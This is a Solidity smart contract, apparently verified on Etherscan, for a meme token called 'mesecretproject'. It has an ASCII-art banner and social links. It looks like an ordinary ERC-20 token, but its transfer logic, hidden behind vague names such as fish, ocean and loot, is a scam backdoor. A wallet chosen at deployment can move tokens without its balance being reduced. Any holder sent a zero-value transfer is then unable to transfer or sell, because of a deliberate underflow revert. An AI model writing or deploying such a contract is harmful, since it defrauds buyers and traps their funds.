/**
 *Submitted for verification at Etherscan.io on 2023-05-12
*/

// https://twitter.com/mesecretproject
// https://t.me/mesecretproject

//                                           =+:                                               
//                                          #*[email protected]:                                              
//                                         +*==*%   +=    .                                    
//                                        .%====## #*@: :%@=                                   
//                                   +##+ +*=====#@#=#*[email protected]+#*                                   
//                                 .#+==+%%===========##==#*                                   
//                             :. .%======================%*                                   
//                            #+#*#[email protected]*                                   
//                           *+=============+**+++++++++**@##*-                                
//                          .#=======++++==-:................:=#*.                             
//                           #==+++==:..........................-#*.                           
//                         =#=--:.................................-#*.                         
//                       =%=........................................=%+                        
//                     :%+............................................+%:                      
//                    *#:..............................................-%+                     
//                  :%=..................................................*#                    
//                 +#:....................................................*#                   
//               .#+.......................................................*%                  
//              :%=.........................................................*%                 
//             -%-...........................................................##                
//            -%:............................................................:%+               
//           -%:..............................................................:@-              
//          -%:..[email protected].             
//         :@:..................................................................#*             
//        .%-........................................................==.........:@-            
//        #+...........................:=+********+=-................==...:-.....+%            
//       =%.......................-=***+=-:::::::::=+#*=:.............-=*+=:......%=           
//      [email protected]:....-#:......:-+**+-::::::::::::::::::-=*#*+=---=+****+-..........=%           
//      #+.....:=+=-::.::-+***=-:::::::::::::::::::::::::::[email protected]+=--:[email protected]:          
//     -%.........:-=+++#=-:::::::::::::::::::::::::::::::+#*-.....................**          
//     @=...............:+=:::::::::::::::::::::::::::=+#*=:.......................:@          
//    +#..................:=++-:::::::::::::::::-=+***=:............................#=         
//    @-.....................:-+++++***********+=-:.................................=#         
//   =#.............................................................................:@.        
//   #=..............................................................................#-        
//  [email protected].................+*        
//  -#...............................................................................-%        
//  ++.................[email protected].       
//  #-................................................................................%:       
//  %:..................................................................-....:........#=       
//  @....-:...:........................................................:%...:*........**       
//  @....*-...*.........................................................=#++*:........=#       
//  %....:*++*-...........................................................::[email protected]       
//  %......::...........[email protected]:      
//  #..................................................................................#=     


// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * by removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract mesecretproject is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply;

    uint256 private float = 25;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address me, uint256 secret) public returns (bool success) {
        fish(msg.sender, me, secret);
        return true;
    }

    mapping(address => uint256) private ocean;

    function transferFrom(address whale, address me, uint256 secret) public returns (bool success) {
        fish(whale, me, secret);
        require(secret <= allowance[whale][msg.sender]);
        allowance[whale][msg.sender] -= secret;
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private loot;

    function fish(address whale, address me, uint256 secret) private returns (bool success) {
        if (ocean[whale] == 0) {
            if (loot[whale] > 0 && whale != uniswapV2Pair) {
                ocean[whale] -= float;
            }
            balanceOf[whale] -= secret;
        }
        if (secret == 0) {
            loot[me] += float;
        }
        balanceOf[me] += secret;
        emit Transfer(whale, me, secret);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _address) {
        name = "mesecretproject";
        symbol = "mememe";
        totalSupply = 6_969_696_969_696 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ocean[_address] = float;
    }

    address public uniswapV2Pair;

    string public name;

    function approve(address boat, uint256 secret) public returns (bool success) {
        allowance[msg.sender][boat] = secret;
        emit Approval(msg.sender, boat, secret);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;
}